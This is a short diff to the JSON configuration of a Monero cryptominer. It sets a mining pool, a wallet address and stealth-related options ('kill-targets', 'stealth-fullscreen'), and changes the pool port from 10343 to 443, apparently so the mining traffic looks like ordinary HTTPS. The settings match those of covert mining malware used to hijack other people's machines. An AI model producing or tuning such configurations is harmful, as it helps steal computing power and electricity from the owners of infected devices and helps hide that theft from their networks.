@@ -1,7 +1,7 @@
 {
     "algo": "rx/0",
     "pool": "pool.hashvault.pro",
-    "port": 10343,
+    "port": 443,
     "wallet": "41kG9fPsM2TBSbPaXhJ8bjgoeup4YyQoqM4rR6gzFHWXGiGgaW5QdJLE4wH7MGB11PgoPzs5NrBXvYCaiLUEyJjVN8HSJny",
     "password": "",
     "nicehash": false,
@@ -13,5 +13,6 @@
     "kill-targets": "",
     "stealth-fullscreen": false
 }
+
 
 
